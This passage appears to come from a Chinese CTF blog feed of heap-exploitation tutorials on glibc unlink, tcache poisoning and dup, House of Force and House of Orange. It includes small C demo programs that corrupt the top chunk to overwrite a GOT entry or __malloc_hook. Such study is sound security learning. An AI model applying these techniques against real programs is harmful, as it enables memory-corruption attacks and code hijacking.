的流程大致相同，函数内部同样会调用 vtable 中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口 write 函数。</p><p>printf 的调用栈回溯如下，同样是通过_IO_file_xsputn 实现</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">vfprintf<span class="token operator">+</span><span class="token number">11</span>_IO_file_xsputn_IO_file_overflowfunlockfile_IO_file_writewrite<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-unlink</title>
      <link href="//post/pwn-unlink.html"/>
      <url>//post/pwn-unlink.html</url>
      
        <content type="html"><![CDATA[<h1 id="unlink-再探"><a href="#unlink-再探" class="headerlink" title="unlink 再探"></a>unlink 再探</h1><p>很久前尝试学过一段时间unlink，结果后来做题时才发现我的unlink一直是一知半解的水平，称最近有空，系统的再理一遍</p><span id="more"></span><h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p>unlink是一个宏操作，用于将某一个空闲 chunk 从其所处的双向链表中脱链，</p><p>利用unlink 所造成的漏洞时，其实就是对进行 unlink chunk 进行<strong>内存布局</strong>，然后借助 <strong>unlink</strong> 操作来达成修改指针的效果。</p><p>其基本的过程如下</p><p><img src="https://ctf-wiki.org/pwn/linux/glibc-heap/implementation/figure/unlink_smallbin_intro.png" alt="img"></p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol><li>UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ol><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>设指向可 UAF chunk 的指针的地址为 ptr</p><ol><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ol><p>ptr 处的指针会变为 ptr - 0x18。</p><h3 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h3><p>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h3>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-Tcache_Attack</title>
      <link href="//post/pwn-Tcache-Attack.html"/>
      <url>//post/pwn-Tcache-Attack.html</url>
      
        <content type="html"><![CDATA[<h1 id="Tcache-Attack"><a href="#Tcache-Attack" class="headerlink" title="Tcache Attack"></a>Tcache Attack</h1><p>其实做题时遇到过很多次tcache的东西，但一直没有系统的整理过一次。</p><span id="more"></span><h2 id="0x01-Tcache"><a href="#0x01-Tcache" class="headerlink" title="0x01 Tcache"></a>0x01 Tcache</h2><p><code>tcache_get()</code> 和 <code>tcache_put()</code>这两个函数会在函数 _int_free 和 __libc_malloc的开头被调用，其中 <code>tcache_put</code> 当所请求的分配大小不大于<code>0x408</code>并且当给定大小的 tcache bin 未满时调用。一个tcache bin中的最大块数<code>mp_.tcache_count</code>是<code>7</code>。</p><p>我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的check，并没有 fastbin 那么复杂，仅仅检查 <code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p><h3 id="内存申请："><a href="#内存申请：" class="headerlink" title="内存申请："></a>内存申请：</h3><p>在内存分配的malloc函数中有多处，会将内存块移入tcache中。</p><p>（1）首先，申请的内存块符合fastbin大小时并且在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。</p><p>（2）其次，申请的内存块符合smallbin大小时并且在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。</p><p>（3）当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。</p><h3 id="tcache-取出："><a href="#tcache-取出：" class="headerlink" title="tcache 取出："></a>tcache 取出：</h3><p>在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。</p><p>在循环处理unsorted bin内存块时，如果达到放入unsorted bin块最大数量，会立即返回。默认是0，即不存在上限。</p><h2 id="0x02-Attack"><a href="#0x02-Attack" class="headerlink" title="0x02 Attack"></a>0x02 Attack</h2><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p><p>基本和Fastbin Attack一样，只是比Ffastbin少了很多检察，更容易利用</p><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h3><p>也基本类似于Fastbin dup，不过利用的是 <code>tcache_put()</code> 的不严谨</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> __always_inline <span class="token keyword">void</span><span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> <span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p><p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p><h3 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h3><p>在smallbin中包含有空闲块的时候，会同时将同大小的其他空闲块，放入tcache中，此时也会出现解链操作，但相比于unlink宏，缺少了链完整性校验。因此，原本unlink操作在该条件下也可以使用。</p><h3 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h3><p>在2.26 之后的 libc 版本后，我们首先得先把tcache 填满：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span><span class="token operator">*</span> t<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token operator">*</span>a<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token operator">*</span>b<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// make tcache bin full</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">free</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// a is put in an unsorted bin because the tcache bin of this size is full</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后，我们就可以 leak libc 了。</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>tcache本身可以当成一个具有一些特殊性质的fastbin，利用操作都和Fastbin Attack差不太多。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-House_of_Force</title>
      <link href="//post/pwn-House-of-Force.html"/>
      <url>//post/pwn-House-of-Force.html</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><p>上一篇（House of Orange）是修改top chunk的size来在没有free操作下构造被free的堆块(unsorted bin),同时还有一个技巧叫的House of Force，同样是修改top chunk的size位，使得 top chunk 指向期望的任何位置，这就相当于一次任意地址写。</p><span id="more"></span><h2 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h2><p>House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：</p><ol><li>能够以溢出等方式控制到 top chunk 的 size 域</li><li>能够自由地控制堆分配尺寸的大小</li><li>libc-2.23</li></ol><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理。</p><p>进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时可以使得 top chunk 指向期望的任何位置，这就相当于一次任意地址写。</p><p>然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 获取当前的top chunk，并计算其对应的大小</span>victim <span class="token operator">=</span> av<span class="token operator">-></span>top<span class="token punctuation">;</span>size   <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span>    remainder      <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>    av<span class="token operator">-></span>top        <span class="token operator">=</span> remainder<span class="token punctuation">;</span>    <span class="token function">set_head</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb <span class="token operator">|</span> PREV_INUSE <span class="token operator">|</span>            <span class="token punctuation">(</span>av <span class="token operator">!=</span> <span class="token operator">&amp;</span>main_arena <span class="token operator">?</span> NON_MAIN_ARENA <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">set_head</span><span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">check_malloced_chunk</span><span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">alloc_perturb</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制 top chunk size 域的漏洞。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>size<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb <span class="token operator">+</span> MINSIZE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>一般的做法是把 top chunk 的 size 改为 - 1，</strong>因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">remainder      <span class="token operator">=</span> <span class="token function">chunk_at_offset</span><span class="token punctuation">(</span>victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>av<span class="token operator">-></span>top        <span class="token operator">=</span> remainder<span class="token punctuation">;</span><span class="token comment">/* Treat space at ptr + offset as a chunk */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">chunk_at_offset</span><span class="token expression"><span class="token punctuation">(</span>p<span class="token punctuation">,</span> s<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>mchunkptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p><p><strong>与此同时，我们需要注意的是，topchunk 的 size 也会更新，其更新的方法如下</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">victim <span class="token operator">=</span> av<span class="token operator">-></span>top<span class="token punctuation">;</span>size   <span class="token operator">=</span> <span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>remainder_size <span class="token operator">=</span> size <span class="token operator">-</span> nb<span class="token punctuation">;</span><span class="token function">set_head</span><span class="token punctuation">(</span>remainder<span class="token punctuation">,</span> remainder_size <span class="token operator">|</span> PREV_INUSE<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p><h2 id="0x01-示例"><a href="#0x01-示例" class="headerlink" title="0x01 示例"></a>0x01 示例</h2><h3 id="示例1，修改top-chunk地址更低位的内容"><a href="#示例1，修改top-chunk地址更低位的内容" class="headerlink" title="示例1，修改top chunk地址更低位的内容"></a>示例1，修改top chunk地址更低位的内容</h3><p>wiki上的示例1我本地运行一直有问题，在参考了其他师傅关于HOF的讲解下我自己整理了一个示例</p><h4 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h4><p><img src="https://pic.imgdb.cn/item/60e98df75132923bf8ad5835.jpg"></p><h4 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//修改malloc的got表，改成puts函数</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token operator">*</span>ptr2<span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>ptr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                 <span class="token comment">// &lt;=== 修改top chunk size                </span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">4120</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// &lt;=== 增大top chunk指针</span>    p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>puts<span class="token punctuation">;</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">123456</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>当运行完<code>*ptr = -1; </code>时，topchunk的位置正确但size位已经变为0xffffffffffffffff</p><p><img src="https://pic.imgdb.cn/item/60e98f575132923bf8b70dd5.jpg"></p><p><img src="https://pic.imgdb.cn/item/60e98f705132923bf8b7c0c6.jpg"></p><p>之后运行<code>malloc(-4120); </code>，这里从汇编可以看出传入的参数为会被视为一个超大的正整数，具体计算如下</p><p>可以看出malloc的got表地址为0x601028，意图修改malloc@got且满足对齐的情况下，应构造出可以修改0x0601020的指针</p><p><img src="https://pic.imgdb.cn/item/60e98ff55132923bf8bb76b1.jpg"></p><p>而top chunk的地址为0x0602020，我们应该使下一个指针指向0x0601020-0x10 = 0x0601010，即</p><p>0x601010 - 0x602020 =  -4112.之后使chunk对齐，补成 -4120，但同时会指向0x601010</p><p><img src="https://pic.imgdb.cn/item/60e99aa45132923bf80f00c7.jpg"></p><p>这里可以看到，我们成功修改了malloc的got表为puts的plt表，但由于新chunk的size位的问题修改了原来put@got的内容，所以程序任不能运行，不过到这里就可以看出成功利用了HOF来达到任意地址写的功能。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>回顾一下，这个程序是怎么做到劫持运行流程导致修改了 <strong>puts()</strong> 函数的got表的：</p><ul><li>修改了空闲堆块的 <strong>size</strong> 字段，从而避免下一步空间不够</li><li>控制了 <strong>malloc()</strong> 申请的字节数，从而分配了超大空间</li></ul><h3 id="示例2，修改比top-chunk地址更高位的内容"><a href="#示例2，修改比top-chunk地址更高位的内容" class="headerlink" title="示例2，修改比top chunk地址更高位的内容"></a>示例2，修改比top chunk地址更高位的内容</h3><p>本地环境同上</p><h4 id="示例程序-1"><a href="#示例程序-1" class="headerlink" title="示例程序"></a>示例程序</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> <span class="token operator">*</span>ptr<span class="token punctuation">,</span><span class="token operator">*</span>ptr2<span class="token punctuation">,</span><span class="token operator">*</span>p<span class="token punctuation">;</span>    ptr<span class="token operator">=</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ptr<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>ptr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>ptr<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                 <span class="token comment">//&lt;=== 修改top chunk size</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">140737345551056</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//&lt;=== 增大top chunk指针</span>    <span class="token comment">//0x7ffff7dd1b00-0x602020-0x10 = 140737345551056</span>    p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token number">0xdeadbeaf</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>程序代码与示例 1 基本相同，除了第二次 malloc 的 size 有所不同。 这次目标是 malloc_hook。</p><p> malloc_hook 是位于 libc.so 里的全局变量值，由调试得知 __malloc_hook 的地址位于  0x7ffff7dd1b10</p><p><img src="https://pic.imgdb.cn/item/60e99e625132923bf82f9a54.jpg"></p><p>0x7ffff7dd1b00-0x602020-0x10 = 140737345551056 经过这次 malloc 之后，我们可以观察到 top chunk 的地址被抬高到了 0x00007ffff7dd1b00</p><p><img src="https://pic.imgdb.cn/item/60e99f015132923bf8355da0.jpg"></p><p>之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了</p><p>修改结果：</p><p><img src="https://pic.imgdb.cn/item/60e99f6b5132923bf8394481.jpg"></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>这就是 <strong>House of Force</strong> 的堆溢出利用技术。通常，这种利用方式需要满足两个条件：</p><ul><li>需要存在溢出漏洞，攻击者可以控制空闲堆块的 <strong>size</strong> 字段</li><li>攻击者可以控制 <strong>malloc</strong> 的字节数和 <strong>malloc</strong> 的调用次数</li></ul><p>只要满足这些条件，就可以利用例子中的方法抬高或者压低空闲堆块的地址，从而获得任意地址写的机会。</p><p>当然，不同版本 <strong>GLIBC</strong> 的堆块分配和处理方法都略有差异，真实利用时还需要在对应版本的 <strong>GLIBC</strong> 上仔细分析。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> house </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-House_of_Orange</title>
      <link href="//post/pwn-House-of-Orange.html"/>
      <url>//post/pwn-House-of-Orange.html</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h1><p>记得在虎符的线下赛中就遇到一题需要使用一个被free状态的堆块 (unsorted bin)，但是构造了好久也没啥好的思路，当时还不知道有种技巧叫 House of Orange，可以在没有free函数的条件下构造出被free状态的堆块。</p><span id="more"></span><h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>House of Orange与其他的 House of XX 利用方法不同，这种利用方法来自于 Hitcon CTF 2016 中的一道同名题目。House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p><h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>这个过程的详细情况：</p><p>假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*Otherwise, relay to handle system-dependent cases*/</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">sysmalloc</span><span class="token punctuation">(</span>nb<span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>perturb_byte<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时 pt_malloc 